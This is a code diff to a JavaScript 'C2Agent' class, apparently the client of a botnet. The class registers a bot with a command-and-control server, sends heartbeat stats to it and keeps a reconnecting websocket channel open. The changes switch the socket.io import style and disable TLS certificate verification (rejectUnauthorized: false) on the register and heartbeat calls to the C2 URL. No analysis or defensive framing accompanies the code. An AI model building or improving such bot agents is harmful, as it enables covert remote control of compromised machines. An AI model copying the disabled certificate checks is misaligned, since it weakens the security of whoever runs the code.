@@ -1,4 +1,4 @@
-import { io } from 'socket.io-client';
+import socketIOClient from 'socket.io-client';
 import os from 'os';
 import crypto from 'crypto';
 import axios from 'axios';
@@ -58,7 +58,10 @@ export class C2Agent {
                 `${this.config.c2Url}/api/bot/register`,
                 botInfo,
                 {
-                    headers: { 'Content-Type': 'application/json' }
+                    headers: { 'Content-Type': 'application/json' },
+                    httpsAgent: new (await import('https')).Agent({
+                        rejectUnauthorized: false
+                    })
                 }
             );
 
@@ -82,7 +85,7 @@ export class C2Agent {
     }
 
     connectWebSocket() {
-        this.socket = io(this.config.c2Url, {
+        this.socket = socketIOClient(this.config.c2Url, {
             transports: ['websocket'],
             reconnection: true,
             reconnectionDelay: this.config.reconnectInterval
@@ -241,7 +244,10 @@ export class C2Agent {
                     `${this.config.c2Url}/api/bot/${this.botId}/heartbeat`,
                     { stats },
                     {
-                        headers: { 'Content-Type': 'application/json' }
+                        headers: { 'Content-Type': 'application/json' },
+                        httpsAgent: new (await import('https')).Agent({
+                            rejectUnauthorized: false
+                        })
                     }
                 );
 
